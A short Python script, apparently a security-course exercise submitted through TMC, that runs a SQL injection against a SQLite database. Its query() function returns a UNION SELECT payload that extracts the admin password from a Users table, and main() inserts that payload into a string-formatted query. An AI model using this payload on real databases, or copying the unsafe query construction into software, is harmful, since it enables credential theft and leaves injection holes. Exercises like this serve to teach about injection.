#!/usr/bin/env python3
import sys
import sqlite3
import string

def query():
	return "123' UNION SELECT password FROM Users WHERE admin = 1 AND name LIKE '"


def main(argv):
	username = sys.argv[1]
	dbname = sys.argv[2]
	conn = sqlite3.connect(dbname)
	cursor = conn.cursor()
	response = cursor.execute("SELECT body FROM Tasks WHERE name='%s' and body LIKE '%%%s%%'" % (username, query())).fetchall()
	print('Found entries:')
	for r in response:
		print(r[0])


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s username database' % sys.argv[0])
	else:
		main(sys.argv)
